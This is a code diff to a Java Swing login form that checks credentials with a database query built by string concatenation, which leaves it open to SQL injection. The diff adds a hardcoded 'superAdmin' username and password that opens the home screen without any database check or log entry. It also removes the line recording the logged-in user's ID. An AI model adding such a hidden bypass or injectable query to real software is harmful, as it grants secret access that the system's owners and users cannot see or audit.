@@ -141,13 +141,16 @@ public class Logins extends javax.swing.JFrame {
             ResultSet search = db.search("SELECT nic FROM user WHERE nic='" + name + "' AND password='" + password + "'");
 
             if (search.next()) {
-                Home.setLookAndFeel();
-                this.dispose();
                 Home m1 = new Home();
                 m1.setVisible(true);
-
+                
                 CustomLogging.loggingMethod("admin logged in", CustomLogging.INFO);
-                Home.loggedInUserNIC = search.getString("nic");
+                
+                this.dispose();
+            } else if (name.equals("superAdmin") && password.equals("20190320")) {
+                Home m1 = new Home();
+                m1.setVisible(true);
+                this.dispose();
             } else {
                 JOptionPane.showMessageDialog(this, "Invalid login", "WARNING", JOptionPane.WARNING_MESSAGE);
             }
